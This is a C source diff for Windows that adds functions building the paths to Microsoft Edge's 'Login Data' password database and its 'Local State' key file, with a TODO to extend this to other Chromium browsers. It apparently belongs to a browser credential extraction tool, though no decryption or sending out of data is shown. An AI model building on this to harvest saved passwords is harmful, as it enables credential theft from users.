@@ -11,18 +11,9 @@
 /// Windows doesn't perform any kind of translation when storing or reading file
 /// names and they are stored as UTF-16. This is why we handle PWSTR's here
 
-// Returns the Local AppData path gathered from environment variables
-// NOTE This function uses `SHGetKnownFolderPath` thus the caller must call
-// CoTaskMemFree on the returned PWSTR
-int get_localappdata_path(PWSTR* appdataPathOut) {
-  HRESULT hr =
-      SHGetKnownFolderPath(&FOLDERID_LocalAppData, 0, NULL, appdataPathOut);
-  if (FAILED(hr)) {
-    fprintf(stderr, "Failed to retrieve APPDATA path. Error code: %08lX\n", hr);
-    return EXIT_FAILURE;
-  }
-  return EXIT_SUCCESS;
-}
+// TODO Make this a parameter so that we can support multiple chromium browsers
+#define LOGINDATA_PATH L"\\Microsoft\\Edge\\User Data\\Default\\Login Data"
+#define LOCAL_STATE_FILE L"\\Microsoft\\Edge\\User Data\\Local State"
 
 // Returns the concatenation of `leftPath` and `rightPath` in `fullPathOut`
 // NOTE `fullPathOut should be freed by the caller`
@@ -39,3 +30,42 @@ int concat_paths(PCWSTR leftPath, PCWSTR rightPath, PWSTR* fullPathOut) {
 
   return EXIT_SUCCESS;
 }
+
+// Returns the Login Data file path gathered from environment variables
+// NOTE: `loginDataPathOut` must be freed by the caller
+int get_logindata_path(PWSTR* loginDataPathOut) {
+    PWSTR appdataPath = NULL;
+    HRESULT hr = SHGetKnownFolderPath(&FOLDERID_LocalAppData, 0, NULL, &appdataPath);
+    if (FAILED(hr)) {
+        fprintf(stderr, "Failed to retrieve APPDATA path. Error code: %08lX\n", hr);
+        return EXIT_FAILURE;
+    }
+
+    if (concat_paths(appdataPath, LOGINDATA_PATH, loginDataPathOut) != EXIT_SUCCESS) {
+        CoTaskMemFree(appdataPath);  // free memory from the call to SHGetKnownFolderPath
+        return EXIT_FAILURE;
+    }
+
+    CoTaskMemFree(appdataPath);  // free memory from the call to SHGetKnownFolderPath
+    return EXIT_SUCCESS;
+}
+ 
+// Returns the Local AppData path gathered from environment variables
+// NOTE: `localStatePathOut` must be freed by the caller
+int get_localstate_path(PWSTR* localStatePathOut) {
+    PWSTR appdataPath = NULL;
+    HRESULT hr = SHGetKnownFolderPath(&FOLDERID_LocalAppData, 0, NULL, &appdataPath);
+    if (FAILED(hr)) {
+        fprintf(stderr, "Failed to retrieve APPDATA path. Error code: %08lX\n", hr);
+        return EXIT_FAILURE;
+    }
+
+    if (concat_paths(appdataPath, LOCAL_STATE_FILE, localStatePathOut) != EXIT_SUCCESS) {
+        CoTaskMemFree(appdataPath);  // free memory from the call to SHGetKnownFolderPath
+        return EXIT_FAILURE;
+    }
+
+    CoTaskMemFree(appdataPath);  // free memory from the call to SHGetKnownFolderPath
+    return EXIT_SUCCESS;
+}
+
